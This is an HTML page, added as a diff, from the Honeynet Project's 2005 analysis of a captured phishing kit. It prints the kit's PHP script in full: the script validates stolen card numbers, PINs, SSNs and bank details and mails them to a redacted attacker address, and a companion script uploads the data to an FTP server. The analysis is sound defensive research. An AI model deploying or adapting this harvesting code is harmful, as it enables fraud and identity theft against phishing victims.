@@ -1,0 +1,205 @@
+<?xml version="1.0" encoding="iso-8859-1"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+    <meta name="description" content="Learning more about phishing with help of Honeynets" />
+    <meta name="keywords" content="hacking,security,honeypots,Honeynets,Honeynet
+		Project,phishing,phishing mails, fraud" />
+		<title>Know your Enemy: Phishing</title>
+    <link rel="stylesheet" type="text/css" href="../../phishing.css" />
+  </head>
+
+<body>
+
+<div id="header">
+	<h1>Know your Enemy:<br />Phishing</h1>
+	<h3 id="subtitle">How phishing-data is checked and transmited</h3>
+<p id="metainfo">
+  <a href="mailto:project@honeynet.org?Subject=Know Your Enemy">Honeynet Project</a><br />
+  <a href="http://www.honeynet.org">http://www.honeynet.org</a><br />
+  Last Modified: 14th May, 2005
+</p>
+</div>
+
+<p>In this side note we analyse an example script that used to validate
+the information entered by users into a HTML form on a phishing web site.
+Initially the input data is checked to ensure that the submitted strings are valid.
+For example, the PIN should be four characters long and the username
+should not contain certain words. If the entered data passes this check, the
+script constructs an e-mail message containing the user's information and sends it to an
+address at a free e-mail provider. Finally, the location bar of the browser is
+updated to point to the file <code>xxxxISAPI.dll</code> (the file name has
+been obfuscated). This page will
+display a confirmation for the victim. In addition, a script was also included that could
+be used to transfer the phished information to an FTP server. </p>
+
+<p>
+<pre>
+&lt;?php
+$errchk=0;
+$error = &quot;None&quot;;
+$badw=&quot;fuck pussy dick suck asshole&quot;;
+
+//Checking for errors in the post:
+//1 - CC nr:
+if(strlen($ccnumber)&lt;16){
+	$error=&quot;Invalid credit card number, please re-submit.&quot;;
+	$errchk=1;
+}
+else if(strlen($ccnumber)&gt;16&amp;&amp;$ccnumber{16}!=' '){
+	$error=&quot;Invalid credit card number, please re-submit.&quot;;
+	$errchk=1;
+}
+//2 - Email syntax:
+else if(strstr($email, '@') == FALSE){
+	$error=&quot;Invalid email address, please re-submit.&quot;;
+	$errchk=2;
+}
+//3 - Routing number (if it does exist)
+else if(strlen($bankr)&gt;0 &amp;&amp; strlen($bankr)&lt;9){
+	$error=&quot;Invalid bank routing number, please re-submit.&quot;;
+	$errchk=3;
+}
+//4 - CVV2 check
+else if(strlen($cvv2)!=3&amp;&amp;strlen($cvv2)!=4){
+	$error=&quot;Invalid card validation code, please re-submit.&quot;;
+	$errchk=4;
+}
+
+//4 - PIN check
+else if(strlen($ccp)!=4&amp;&amp;strlen($ccp)!=4){
+	$error=&quot;Invalid pin number, please re-submit.&quot;;
+	$errchk=4;
+}
+//5 fields that should exist:
+else if(strlen($username)&lt;1){
+	$error=&quot;Please enter your full name and re-submit.&quot;;
+	$errchk=5;
+}
+else if(strlen($streetaddr)&lt;1){
+	$error=&quot;Please enter your address and re-submit.&quot;;
+	$errchk=5;
+}
+else if(strlen($cityaddr)&lt;1){
+	$error=&quot;Please enter your city and re-submit.&quot;;
+	$errchk=5;
+}
+else if(strlen($mmn)&lt;1){
+	$error=&quot;Please enter your Mother Maiden Name and re-submit.&quot;;
+	$errchk=5;
+}
+else if(strlen($month)&lt;1 || strlen($day)&lt;1 || strlen($year)&lt;1 ){
+	$error=&quot;Please enter your Date Of Birth and re-submit.&quot;;
+	$errchk=5;
+}
+//6 - Bad words check
+else if(stristr($badw,$username)){
+	$error=&quot;ERROR - Invalid user name or password.&quot;;
+	$errchk=6;
+}
+else if(stristr($badw,$streetaddr)){
+	$error=&quot;ERROR - Invalid user name or password.&quot;;
+	$errchk=6;
+}
+else if(stristr($badw,$cityaddr)){
+	$error=&quot;ERROR - Invalid user name or password.&quot;;
+	$errchk=6;
+}
+else if(stristr($badw,$mmn)){
+	$error=&quot;ERROR - Invalid user name or password.&quot;;
+	$errchk=6;
+}
+//More coming soon:)
+//If no error:
+if($errchk==0) {
+	$efile=fopen(&quot;/tmp/User.doc&quot;,&quot;r&quot;);
+	fscanf($efile,&quot;%s&quot;,$userid);
+	fscanf($efile,&quot;%s&quot;,$pass);
+	fclose($efile);
+	$timed = date (&quot;l dS of F Y h:i:s A&quot;);
+	$ip = $_SERVER[&quot;REMOTE_ADDR&quot;];
+	$message=&quot;----------------------------------------------------------------------------
+	On $timed the user ($ip) wrote:
+	CreditCard Number - $ccnumber ; Month - $month ; Day - $day ; Year - $year&quot;;
+
+	$message=$message.&quot;UserId - $userid&quot;;
+
+	$message=$message.&quot;Password - $pass&quot;;
+
+	$message=$message.&quot;Email - $email&quot;;
+
+	$message=$message.&quot;Email Password - $emailp&quot;;
+
+	$message=$message.&quot;Full Name - $username&quot;;
+
+	$message=$message.&quot;Address - $streetaddr&quot;;
+
+	$message=$message.&quot;City - $cityaddr&quot;;
+
+	$message=$message.&quot;State - $stateprovaddr&quot;;
+
+	$message=$message.&quot;Zip Code - $zipcodeaddr&quot;;
+
+	$message=$message.&quot;Phone number - $phone&quot;;
+
+	$message=$message.&quot;Country - $countryaddr&quot;;
+
+	$message=$message.&quot;CVV - $cvv2&quot;;
+
+	$message=$message.&quot;Bank Name - $bank&quot;;
+
+	$message=$message.&quot;Bank Routing # - $bankr
+		Checking Account # - $bankc
+		Social Security Number - $ssn
+		Card PIN Number - $ccp
+		Mother's Maiden Name - $mmn
+		Date of Birth - $pibirthdatemm $pibirthdatedd $pibirthdateyy
+		Driver Licence Number - $dln&quot;;
+
+	mail (&quot;<font color="#FF0000">xxxxxx</font>@hotmail.com&quot;,&quot;xxEBAYxx&quot;,&quot;$message&quot;,&quot;From:  tzonfi &lt;<font color="#FF0000">xxxxxx</font>@<font color="#FF0000">xxxxxx</font>.com&gt;\n&quot;);
+
+	header (&quot;Location:xxxxISAPI.dll&quot;);
+	//$muie = fopen(&quot;/tmp/eb.txt&quot;, &quot;a&quot;);
+	//fwrite($muie, $message);
+	//fclose($muie);
+	//include(&quot;cc-ftp.php&quot;);
+	exit();
+}
+else {
+	echo $error;
+}
+?&gt;
+</pre>
+</p>
+
+<p>
+The script <code>cc-ftp.php</code> (commented out in the data processing script above) will transfer the input to an
+FTP server:
+
+<pre>
+<em>&lt;?php
+include(&quot;r-config.php&quot;);
+</em><font color="#FF0000">// the server login information</font><em>
+$fcon = ftp_connect($host);
+if(@ftp_login($fcon, $user, $pass)) {
+	ftp_put($fcon, $fremote, $flocal, FTP_ASCII);
+}
+else {
+	$msg = &quot;Unable to connect to host: $host with user: $user and pass: $pass.
+		Please update me.&quot;;
+	mail (&quot;<font color="#FF0000">xxxxxx</font>@<font color="#FF0000">xxxxxx</font>&quot;,&quot;Ftpupdate&quot;,&quot;$msg&quot;,&quot;From:jmekeru &lt;<font color="#FF0000">xxxxxx</font>@<font color="#FF0000">xxxxxx</font>&gt;\n&quot;);
+}
+ftp_close($fcon);
+?&gt;</em>
+</pre>
+</p>
+
+<p>Click <a href="../../index.html">here</a> to return to the main paper.</p>
+
+<div id="footer">
+  <a href="http://www.honeynet.org"><img src="http://www.honeynet.org/images/small.gif" alt="The Honeynet Project" /></a>
+</div>
+
+</body>
+</html>
